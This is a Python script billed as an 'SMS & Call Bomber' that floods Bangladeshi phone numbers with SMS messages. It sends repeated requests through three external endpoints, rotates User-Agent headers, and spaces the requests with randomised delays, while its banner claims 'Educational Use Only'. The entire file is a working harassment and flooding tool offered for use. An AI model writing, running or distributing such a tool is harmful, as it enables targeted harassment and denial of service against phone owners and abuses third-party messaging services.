import requests
import time
import random
import sys
import os

# ANSI escape codes for colors
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

# Original ASCII Art
SM_ART = f"""
{Colors.CYAN}
                          _____ __  __ 
                        / ____|  \/  |
                       | (___ | \✨/ |
                        \___ \| |\/| |
                        ____) | |  | |
                       |_____/|_|  |_|

                 {Colors.YELLOW}=== SM CORPORATE 🍁 SM & Call Bomber ==={Colors.RESET}
                 Coded by: SM 🍁 
                 For Educational Use Only!
"""

# API configuration
APIS = [
    {
        "name": "Trial API",
        "url": "https://bomberdemofor2hrtcs.vercel.app/api/trialapi",
        "method": "GET",
        "params": {"phone": "{number}", "type": "sms"}
    },
    {
        "name": "Kalluraad API",
        "url": "http://kalluraad.42web.io/index.php",
        "method": "GET",
        "params": {"number": "{number}"}
    },
    {
        "name": "Nasaraad API",
        "url": "http://nasaraad.rf.gd/index.php",
        "method": "GET",
        "params": {"number": "{number}"}
    }
]

# Random User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

def clear_screen():
    try:
        os.system("clear" if os.name == "posix" else "cls")
    except Exception:
        print("\n" * 50)  # Fallback for Termux issues

def validate_phone(phone):
    return phone.strip().isdigit() and len(phone.strip()) == 11 and phone.strip().startswith("01")

def send_request(phone, api):
    url = api["url"]
    params = {key: value.replace("{number}", phone) for key, value in api["params"].items()}
    headers = {"User-Agent": random.choice(USER_AGENTS)}

    for attempt in range(2):  # Retry once on failure
        try:
            response = requests.get(url, params=params, headers=headers, timeout=10)
            if response.status_code == 200:
                try:
                    # Check if response contains success indicators
                    json_response = response.json()
                    if json_response.get("success", False) or "success" in response.text.lower():
                        print(f"{Colors.GREEN}SMS sent via {api['name']}{Colors.RESET}")
                        return {"success": True}
                    else:
                        print(f"{Colors.RED}SMS failed via {api['name']}: {response.text[:100]}{Colors.RESET}")
                        return {"success": False}
                except ValueError:
                    # Non-JSON response, check for success in text
                    if "success" in response.text.lower():
                        print(f"{Colors.GREEN}SMS sent via {api['name']}{Colors.RESET}")
                        return {"success": True}
                    else:
                        print(f"{Colors.RED}SMS failed via {api['name']}: {response.text[:100]}{Colors.RESET}")
                        return {"success": False}
            else:
                print(f"{Colors.RED}SMS failed via {api['name']}: Status {response.status_code}{Colors.RESET}")
                return {"success": False}
        except requests.RequestException as e:
            print(f"{Colors.RED}SMS failed via {api['name']}: {str(e)}{Colors.RESET}")
            if attempt == 0:
                time.sleep(1)  # Wait before retry
                continue
            return {"success": False}

def main():
    clear_screen()
    print(SM_ART)
    
    # Phone numbers input
    try:
        phone_input = input(f"{Colors.CYAN}Enter Bangladeshi numbers (e.g., 01712345678,01987654321): {Colors.RESET}").strip()
        phone_numbers = [phone.strip() for phone in phone_input.split(",") if phone.strip()]
        
        # Validate phone numbers
        if not phone_numbers:
            print(f"{Colors.RED}No valid numbers entered!{Colors.RESET}")
            input("Press Enter to exit...")
            return
        for phone in phone_numbers:
            if not validate_phone(phone):
                print(f"{Colors.RED}Invalid number {phone}! Must be 11 digits starting with 01.{Colors.RESET}")
                input("Press Enter to exit...")
                return
    except Exception as e:
        print(f"{Colors.RED}Error in phone input: {str(e)}{Colors.RESET}")
        input("Press Enter to exit...")
        return

    # Count input for SMS only
    try:
        sms_count = int(input(f"{Colors.CYAN}Enter number of SMS requests per number (0-100): {Colors.RESET}").strip())
        if not (0 <= sms_count <= 100):
            raise ValueError("Count must only be between 0 and 100")
        if sms_count == 0:
            print(f"{Colors.RED}SMS count cannot be 0!{Colors.RESET}")
            input("Press Enter to exit...")
            return
    except ValueError as e:
        print(f"{Colors.RED}Invalid count! {str(e)}{Colors.RESET}")
        input("Press Enter to exit...")
        return

    # Delay input
    try:
        delay = float(input(f"{Colors.CYAN}Enter delay between requests (seconds, e.g., 2): {Colors.RESET}").strip())
        if delay < 0:
            raise ValueError("Delay must be non-negative")
    except ValueError as e:
        print(f"{Colors.RED}Invalid delay! {str(e)}{Colors.RESET}")
        input("Press Enter to exit...")
        return

    # Process requests
    for phone in phone_numbers:
        request_list = []
        for api in APIS:
            request_list.extend([(api) for _ in range(sms_count)])
        random.shuffle(request_list)

        if not request_list:
            print(f"{Colors.RED}No requests to send for {phone}!{Colors.RESET}")
            continue

        print(f"\n{Colors.CYAN}Bombing number: {phone}{Colors.RESET}")
        for api in request_list:
            send_request(phone, api)
            time.sleep(delay + random.uniform(0, 1))

    print(f"\n{Colors.GREEN}SMS bombing completed successfully!{Colors.RESET}")
    input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Stopped by user.{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}Unexpected error: {str(e)}{Colors.RESET}")
        input("Press Enter to exit...")
